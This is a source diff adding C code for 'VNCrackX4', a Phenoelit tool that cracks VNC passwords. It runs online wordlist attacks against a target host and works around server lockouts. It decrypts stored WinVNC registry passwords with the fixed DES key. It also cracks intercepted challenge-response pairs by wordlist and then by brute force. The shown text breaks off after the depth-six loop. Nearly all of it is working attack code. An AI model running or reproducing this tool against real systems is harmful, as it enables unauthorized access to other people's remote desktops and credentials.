@@ -1,0 +1,609 @@
+ /* Project code: vncrack for windows (vnx4)
+ *
+ * FX <fx@phenoelit.de>
+ * Phenoelit (http://www.phenoelit.de/)
+ * (c) 2k
+ *
+ */
+#include <stdio.h>
+#include <string.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <winsock.h>
+
+#include "d3des.h"
+#include "vncauth.h"
+extern unsigned char fixedkey[8];
+
+
+#define SPLASH "VNCrackX4 - by Phenoelit (http://www.phenoelit.de/)\n"
+int verbose=0,lbf=0;
+char *schallange=NULL, *sresponse=NULL;
+void interactive(void);
+void cr_crack(char *wordlist);
+
+void *sec_malloc(size_t size) {
+    void *p;
+
+    if ((p=malloc(size))==NULL) {
+  fprintf(stderr,"malloc() failed for %d bytes\n",size);
+  exit (-1);
+    }
+    memset(p,0,size);
+    return p;
+}
+
+void usage(void) {
+    printf("VNCrackX4\n"
+      "by Phenoelit (http://www.phenoelit.de/)\n\n"\
+      "Usage:\n"
+      "Online: ./vncrack -h target.host.com -w wordlist.txt [-opt's]\n"
+      "Windows interactive mode: ./vncrack -W \n"
+      "\tenter hex key one byte per line - find it in\n"
+      "\t\\HKEY_CURRENT_USER\\Software\\ORL\\WinVNC3\\Password or\n"
+      "\t\\HKEY_USERS\\.DEFAULT\\Software\\ORL\\WinVNC3\\Password\n\n"
+      "Options for online mode:\n"
+      "-v\tverbose (repeat -v for more)\n"
+      "-p P\tconnect to port P instead of 5900\n"
+      "Options for PHoss intercepted challages:\n"
+      "-c <challange>\tchallange from PHoss output\n"
+      "-r <response>\tresponse from PHoss output\n"
+      );
+    exit(-1);
+}
+
+void sleep(DWORD ms) {
+  DWORD t1;
+
+  t1=GetTickCount();
+  while (GetTickCount()<(t1+ms));
+
+}
+
+int main(int argc, char **argv) {
+    int sfd; /* socket */
+    unsigned long dest_ip;
+    struct sockaddr_in dest_addr;
+
+
+    char *rbuf;
+    unsigned char atype[4];
+    unsigned char challange[16];
+
+   
+    char *vnchost=NULL;
+  u_short vncport=5900;
+
+    int i,ani=0;
+    char *wordlist=NULL;
+    FILE *fd;
+    char *tryword;
+
+  char servertext[255];
+  char *sthelp;
+
+    int conwait=90;
+
+
+  /* check the command line options */
+  for (i=1;i<argc;i++) {
+    switch (argv[i][1]) {
+
+    case 'v': // verbose
+      verbose++;
+      break;
+    case 'p':
+      if (argv[++i]==NULL) usage();
+      if ((vncport=atoi(argv[i]))==0) {
+        fprintf(stderr,"wrong port number: %s\n",argv[i]);
+        exit (-1);
+      }
+      break;
+    case 'h':
+      if (argv[++i]==NULL) usage();
+      vnchost=(char *)sec_malloc(strlen(argv[i])+1);
+      strcpy(vnchost,argv[i]);
+      break;
+    case 'w':
+      if (argv[++i]==NULL) usage();
+      wordlist=(char *)sec_malloc(strlen(argv[i])+1);
+      strcpy(wordlist,argv[i]);
+      break;
+    case 'W':
+      interactive();
+      break;
+
+    case 'c':
+      if (argv[++i]==NULL) usage();
+      schallange=(char *)sec_malloc(strlen(argv[i])+1);
+      strcpy(schallange,argv[i]);
+      break;
+    case 'r':
+      if (argv[++i]==NULL) usage();
+      sresponse=(char *)sec_malloc(strlen(argv[i])+1);
+      strcpy(sresponse,argv[i]);
+      break;
+   
+    default:
+      usage();
+    }
+  }
+
+    if (schallange||sresponse) {
+    printf(SPLASH);
+    cr_crack(wordlist); /* exit is done here */
+    }
+ 
+
+    if (!(vnchost&&vncport&&wordlist)) usage();
+    printf(SPLASH);
+
+    /* host */
+  dest_ip=inet_addr(vnchost);
+    memcpy(&dest_addr.sin_addr,&dest_ip,sizeof(dest_ip));
+    dest_addr.sin_port=htons(vncport);
+    dest_addr.sin_family=AF_INET;
+ 
+
+  /* make sure we can talk WinSock
+    Comment: I like to enclose this, because it is SO UGLY */
+  {
+    WORD wVersionRequested;
+    WSADATA wsaData;
+    int err;
+    wVersionRequested = MAKEWORD(1, 1);
+
+    err = WSAStartup(wVersionRequested, &wsaData);
+    if (err != 0) {
+      fprintf(stderr,"Unable to start networking");
+      exit (-1);
+    }
+    if ((sfd=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET) {
+      fprintf(stderr,"Unable to get a socket");
+      exit (-1);
+    }
+  } // socket obtained and GO
+
+ 
+    if ((fd=fopen(wordlist,"rt"))==NULL) {
+    fprintf(stderr,"Unable to open wordlist %s\n",wordlist);
+    exit (-1);
+    }
+
+    tryword=sec_malloc(256);
+    while (fgets(tryword,255,fd)!=NULL) {
+     /* cut the word */
+     if (strlen(tryword)>8) tryword[8]='\0';
+    tryword[strlen(tryword)-1]='\0';
+     
+    if (verbose) {
+      printf("\ntrying '%s' ...",tryword);
+      fflush(stdout);
+    }
+
+    if (connect(sfd,(struct sockaddr *)&dest_addr,sizeof(dest_addr))!=0) {
+      fprintf(stderr,"Connect failed.\n");
+      exit(-1);
+    }
+   
+    /* connunication starts with server->client version packet */
+    rbuf=sec_malloc(100);
+    if (recv(sfd,rbuf,100,0)<0) {
+      fprintf(stderr,"recv()");
+      exit(-1);
+    }
+    if (verbose>1) printf("\nServer Protocol version: %s",rbuf);
+
+    /* bounce this message back - so the server will continue */
+    if (send(sfd,rbuf,strlen(rbuf),0)<0) {
+      fprintf(stderr,"send()");
+      exit(-1);
+    }
+
+    if (recv(sfd,atype,sizeof(atype),0)<0) {
+        fprintf(stderr,"recv()");
+      exit(-1);
+    }
+
+    if (verbose>1) {
+      printf("Authentication type: ");
+      for (i=0;i<4;i++) { printf("%x ",atype[i]); }
+      printf("\n");
+    }
+
+    switch (atype[3]) {
+      case 0:
+        fprintf(stderr,"Server told me: connection close\n");
+        if (verbose) {
+          // try to retrieve the reason
+          memset(servertext,0,sizeof(servertext));
+          if (recv(sfd,servertext,sizeof(servertext),0)<0) {
+              fprintf(stderr,"recv() in verbose");
+            exit(-1);
+          } else {
+            sthelp=servertext;
+            sthelp+=4;
+            fprintf(stderr,"Server says: %s\n",sthelp);
+          }
+        }
+        exit(-1);
+        break; /* not reached */
+      case 1:
+        printf( "\n>>>>>>>>>>>>>>>\n"
+        "Server does not require authentication!\n"
+        ">>>>>>>>>>>>>>>\n");
+        exit(-1);
+        break; /* not reached */
+      case 2:
+        if (verbose>1)
+            printf( "Authentication type 'VNC authentication' - fine\n");
+        break;
+      default:
+        fprintf(stderr,"Unknown authentication requested by server\n");
+        exit(-1);
+    }
+ 
+    if (recv(sfd,challange,sizeof(challange),0)<0) {
+      fprintf(stderr,"recv()");
+      exit(-1);
+    }
+     
+    if (verbose>1) {
+      printf("challange: ");
+      for (i=0;i<16;i++) { printf("%x ",challange[i]); }
+      printf("\n");
+    }
+
+    /* encrypt challange with password and send this fuck to the server */
+    vncEncryptBytes(challange,tryword);
+
+    if (send(sfd,challange,sizeof(challange),0)<0) {
+      fprintf(stderr,"auth send()");
+      exit(-1);
+    }
+
+    atype[3]=0;
+    if (recv(sfd,atype,sizeof(atype),0)<0) {
+      fprintf(stderr,"auth recv()");
+        exit(-1);
+    }
+    switch (atype[3]) {
+      case 0:
+        printf( "\n>>>>>>>>>>>>>>>\n"
+        "Password: %s\n"
+        ">>>>>>>>>>>>>>>\n",tryword);
+        free(tryword);
+        exit(0);
+        break; /* not reached */
+
+      case 1: /* 'normal' failed */
+        if (verbose) printf("failed\n");
+        break;
+      case 2: /* too many */
+        printf("Server is angry, waiting for calm down...\n");
+        sleep(10000);
+        break;
+      default:
+        fprintf(stderr,"Unknown response\n");
+        exit(-1);
+    }
+
+    shutdown(sfd,2);
+
+    closesocket(sfd);
+    memset(tryword,0,256);
+    }
+
+    free(tryword);
+    fclose(fd);
+
+    return 0;
+}
+
+void interactive(void) {
+    unsigned char *pass;
+    int i;
+    char c;
+
+    pass=(char *)sec_malloc(9);
+    for (i=0;i<8;i++) {
+  scanf("%x",&c);
+  pass[i]=c;
+    }
+    printf("Entered HEX String: ");
+    for (i=0;i<8;i++) { printf("%x ",pass[i]); }
+    printf("\n");
+
+    deskey(fixedkey,DE1);
+    des(pass,pass);
+    printf("VNC Password: %s\n",pass);
+
+    exit(0);
+}
+
+void cr_crack(char *wordlist) {
+    int i,j;
+#define CRL 16
+    char chl[CRL+1];
+    char rsp[CRL+1];
+    char tchl[CRL+1];
+    char ts[3];
+    FILE *fd;
+    char *tryword;
+
+    char bft[9];
+    char cset1[] =
+  "abcdefghijklmnopqrstuvwxyz"
+  "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+  "1234567890!\"$%&/()=?`''*_:;-.,#+}][{^<>?\0";
+#define cset1_len (92)
+    int cnt[8];
+
+    time_t t1,t2;
+
+  if (!wordlist) {
+    fprintf(stderr,"Supply wordlist file !");
+    exit(-1);
+  }
+
+
+    if ((!schallange)||(!sresponse)) {
+  usage();
+    }
+    if (
+      (strlen(schallange)!=16*2)
+      ||(strlen(sresponse)!=16*2)
+      ) {
+  fprintf(stderr,
+    "challange and response have to be 32 characters each\n");
+  exit (-1);
+    }
+
+    memset(&chl,0,CRL+1);
+    memset(&tchl,0,CRL+1);
+    memset(&rsp,0,CRL+1);
+    memset(&ts,0,3);
+
+    j=0;
+    for (i=0;i<CRL;i++) {
+  strncpy(ts,&schallange[j],2);
+  chl[i]=(unsigned char)strtol(ts,NULL,16);
+  strncpy(ts,&sresponse[j],2);
+  rsp[i]=(unsigned char)strtol(ts,NULL,16);
+  j+=2;
+    }
+    if (verbose) {
+  printf("Challange: ");
+  for (i=0;i<CRL;i++) {
+      printf("%x",(unsigned char) chl[i]);
+  }
+  printf("\n");
+  printf("Response : ");
+  for (i=0;i<CRL;i++) {
+      printf("%x",(unsigned char) rsp[i]);
+  }
+  printf("\n");
+    }
+
+    if ((fd=fopen(wordlist,"rt"))==NULL) {
+  fprintf(stderr,"Could not open wordlist\n");
+  exit (-1);
+    }
+
+    tryword=sec_malloc(256);
+    while (fgets(tryword,255,fd)!=NULL) {
+  tryword[strlen(tryword)-1]='\0';
+  /* try this word */
+  memcpy(tchl,chl,CRL);
+  vncEncryptBytes(tchl,tryword);
+
+  if (verbose>1) {
+      for (i=0;i<CRL;i++) {
+    printf("%x",(unsigned char) rsp[i]);
+      }
+      printf("\n");
+      for (i=0;i<CRL;i++) {
+    printf("%x",(unsigned char) tchl[i]);
+      }
+      printf("\n");
+  }
+
+  if (!memcmp(tchl,rsp,CRL)) {
+      printf( "\n>>>>>>>>>>>>>>>\n"
+        "Password: %s\n"
+        ">>>>>>>>>>>>>>>\n",tryword);
+      free(tryword);
+      exit(0);
+  } else {
+      if (verbose) printf("%s failed\n",tryword);
+  }
+  memset(tryword,0,256);
+    }
+    fclose(fd);
+    free(tryword);
+
+  printf( "-----------------------------------\n"
+      "Wordlist failed - going brute force\n"
+      "-----------------------------------\n" );
+
+  t1=GetTickCount();
+
+    bft[8]='\0';
+
+    bft[1]='\0';
+    printf("\tdepth I\n");
+        for (cnt[0]=0;cnt[0]<cset1_len;cnt[0]++) {
+            bft[0]=cset1[cnt[0]];
+
+            if (verbose)
+          printf("try: %s\n",bft);
+
+            memcpy(tchl,chl,CRL);
+            vncEncryptBytes(tchl,bft);
+            if (!memcmp(tchl,rsp,16)) {
+          printf( "\n>>>>>>>>>>>>>>>\n"
+            "Password: %s\n"
+            ">>>>>>>>>>>>>>>\n",
+            bft);
+          exit (0);
+            }
+        } // for 0
+
+    bft[2]='\0';
+    printf("\tdepth II\n");
+          for (cnt[1]=0;cnt[1]<cset1_len;cnt[1]++) {
+        bft[1]=cset1[cnt[1]];
+
+        for (cnt[0]=0;cnt[0]<cset1_len;cnt[0]++) {
+            bft[0]=cset1[cnt[0]];
+
+            if (verbose)
+          printf("try: %s\n",bft);
+
+            memcpy(tchl,chl,CRL);
+            vncEncryptBytes(tchl,bft);
+            if (!memcmp(tchl,rsp,16)) {
+          printf( "\n>>>>>>>>>>>>>>>\n"
+            "Password: %s\n"
+            ">>>>>>>>>>>>>>>\n",
+            bft);
+          exit (0);
+            }
+        } // for 0
+          } // for 1
+
+    /************/
+    bft[3]='\0';
+    printf("\tdepth III\n");
+      for (cnt[2]=0;cnt[2]<cset1_len;cnt[2]++) {
+          bft[2]=cset1[cnt[2]];
+
+          for (cnt[1]=0;cnt[1]<cset1_len;cnt[1]++) {
+        bft[1]=cset1[cnt[1]];
+
+        for (cnt[0]=0;cnt[0]<cset1_len;cnt[0]++) {
+            bft[0]=cset1[cnt[0]];
+
+            if (verbose)
+          printf("try: %s\n",bft);
+
+            memcpy(tchl,chl,CRL);
+            vncEncryptBytes(tchl,bft);
+            if (!memcmp(tchl,rsp,16)) {
+          printf( "\n>>>>>>>>>>>>>>>\n"
+            "Password: %s\n"
+            ">>>>>>>>>>>>>>>\n",
+            bft);
+          exit (0);
+            }
+        } // for 0
+          } // for 1
+      } //2
+
+    /************/
+    bft[4]='\0';
+    printf("\tdepth IV\n");
+        for (cnt[3]=0;cnt[3]<cset1_len;cnt[3]++) {
+      bft[3]=cset1[cnt[3]];
+
+      for (cnt[2]=0;cnt[2]<cset1_len;cnt[2]++) {
+          bft[2]=cset1[cnt[2]];
+
+          for (cnt[1]=0;cnt[1]<cset1_len;cnt[1]++) {
+        bft[1]=cset1[cnt[1]];
+
+        for (cnt[0]=0;cnt[0]<cset1_len;cnt[0]++) {
+            bft[0]=cset1[cnt[0]];
+
+            if (verbose)
+          printf("try: %s\n",bft);
+
+            memcpy(tchl,chl,CRL);
+            vncEncryptBytes(tchl,bft);
+            if (!memcmp(tchl,rsp,16)) {
+          printf( "\n>>>>>>>>>>>>>>>\n"
+            "Password: %s\n"
+            ">>>>>>>>>>>>>>>\n",
+            bft);
+          exit (0);
+            }
+        } // for 0
+          } // for 1
+      } //2
+        } //3
+
+    /************/
+    bft[5]='\0';
+    printf("\tdepth V\n");
+    for (cnt[4]=0;cnt[4]<cset1_len;cnt[4]++) {
+        bft[4]=cset1[cnt[4]];
+
+        for (cnt[3]=0;cnt[3]<cset1_len;cnt[3]++) {
+      bft[3]=cset1[cnt[3]];
+
+      for (cnt[2]=0;cnt[2]<cset1_len;cnt[2]++) {
+          bft[2]=cset1[cnt[2]];
+
+          for (cnt[1]=0;cnt[1]<cset1_len;cnt[1]++) {
+        bft[1]=cset1[cnt[1]];
+
+        for (cnt[0]=0;cnt[0]<cset1_len;cnt[0]++) {
+            bft[0]=cset1[cnt[0]];
+
+            if (verbose)
+          printf("try: %s\n",bft);
+
+            memcpy(tchl,chl,CRL);
+            vncEncryptBytes(tchl,bft);
+            if (!memcmp(tchl,rsp,16)) {
+          printf( "\n>>>>>>>>>>>>>>>\n"
+            "Password: %s\n"
+            ">>>>>>>>>>>>>>>\n",
+            bft);
+          exit (0);
+            }
+        } // for 0
+          } // for 1
+      } //2
+        } //3
+    } //4
+
+    /************/
+    bft[6]='\0';
+    printf("\tdepth VI\n");
+      for (cnt[5]=0;cnt[5]<cset1_len;cnt[5]++) {
+    bft[5]=cset1[cnt[5]];
+
+    for (cnt[4]=0;cnt[4]<cset1_len;cnt[4]++) {
+        bft[4]=cset1[cnt[4]];
+
+        for (cnt[3]=0;cnt[3]<cset1_len;cnt[3]++) {
+      bft[3]=cset1[cnt[3]];
+
+      for (cnt[2]=0;cnt[2]<cset1_len;cnt[2]++) {
+          bft[2]=cset1[cnt[2]];
+
+          for (cnt[1]=0;cnt[1]<cset1_len;cnt[1]++) {
+        bft[1]=cset1[cnt[1]];
+
+        for (cnt[0]=0;cnt[0]<cset1_len;cnt[0]++) {
+            bft[0]=cset1[cnt[0]];
+
+            if (verbose)
+          printf("try: %s\n",bft);
+
+            memcpy(tchl,chl,CRL);
+            vncEncryptBytes(tchl,bft);
+            if (!memcmp(tchl,rsp,16)) {
+          printf( "\n>>>>>>>>>>>>>>>\n"
+            "Password: %s\n"
+            ">>>>>>>>>>>>>>>\n",
+            bft);
+          exit (0);
+            }
+        } // for 0
+          } // for 1
+      } //2
+        } //3
+    } //4
+      } //
